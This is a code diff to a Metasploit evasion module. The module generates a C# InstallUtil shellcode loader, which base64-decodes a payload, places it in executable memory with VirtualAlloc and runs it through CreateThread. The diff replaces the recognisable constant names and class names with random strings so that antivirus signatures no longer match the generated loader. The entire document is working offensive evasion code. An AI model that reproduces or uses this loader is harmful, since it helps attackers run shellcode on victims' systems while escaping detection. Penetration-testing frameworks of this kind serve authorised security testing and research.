@@ -65,6 +65,9 @@ class MetasploitModule < Msf::Evasion
     mode = Rex::Text.rand_text_alpha (3)
     modf = Rex::Text.rand_text_alpha (3)
     modg = Rex::Text.rand_text_alpha (3)
+    modh = Rex::Text.rand_text_alpha (3)
+    modi = Rex::Text.rand_text_alpha (3)
+    modj = Rex::Text.rand_text_alpha (3)
     <<~HEREDOC
        /*
        #{instructions}
@@ -72,13 +75,13 @@ class MetasploitModule < Msf::Evasion
        using System;
        namespace #{Rex::Text.rand_text_alpha 3}
        {
-       public class #{Rex::Text.rand_text_alphanumeric 3} { public static void Main() { } }
+       public class #{Rex::Text.rand_text_alpha 3} { public static void Main() { } }
        [System.ComponentModel.RunInstaller(true)]
-       public class #{Rex::Text.rand_text_alphanumeric 3} : System.Configuration.Install.Installer
+       public class #{Rex::Text.rand_text_alpha 3} : System.Configuration.Install.Installer
        {
-       private static Int32 MEM_COMMIT=0x1000;
-       private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
-       private static UInt32 INFINITE = 0xFFFFFFFF;
+       private static Int32 #{modh}=0x1000;
+       private static IntPtr #{modi}=(IntPtr)0x40;
+       private static UInt32 #{modj} = 0xFFFFFFFF;
        [System.Runtime.InteropServices.DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
        [System.Runtime.InteropServices.DllImport("kernel32")]
@@ -98,10 +101,10 @@ class MetasploitModule < Msf::Evasion
        string #{moda} = "#{esc}";
        byte[] #{modb} = Convert.FromBase64String(#{moda});
        byte[] #{modc} = #{modb};
-       IntPtr #{modd} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{modc}.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+       IntPtr #{modd} = VirtualAlloc(IntPtr.Zero, (UIntPtr)#{modc}.Length, #{modh}, #{modi});
        System.Runtime.InteropServices.Marshal.Copy(#{modc}, 0, #{modd}, #{modc}.Length);
        IntPtr #{mode} = IntPtr.Zero;
-       WaitForSingleObject(CreateThread(#{mode}, UIntPtr.Zero, #{modd}, #{mode}, 0, ref #{mode}), INFINITE);
+       WaitForSingleObject(CreateThread(#{mode}, UIntPtr.Zero, #{modd}, #{mode}, 0, ref #{mode}), #{modj});
        }
        }
        }
